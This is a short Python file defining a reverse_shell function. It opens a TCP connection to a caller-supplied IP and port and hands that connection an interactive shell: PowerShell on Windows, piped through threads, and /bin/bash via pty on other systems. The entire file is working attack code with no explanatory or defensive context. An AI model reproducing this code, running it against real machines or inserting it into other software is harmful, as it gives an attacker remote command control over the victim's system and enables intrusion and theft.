def reverse_shell(ip, port):
    import os, platform
    ip = ip
    port = port
    if(platform.system() == "Windows"):
        import socket,subprocess,threading;
        def s2p(s, p):
            while True:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()

        def p2s(s, p):
            while True:
                s.send(p.stdout.read(1))

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((str(ip), int(port)))

        p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            s.close()
    else:
            import socket, subprocess, os, pty
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn("/bin/bash")
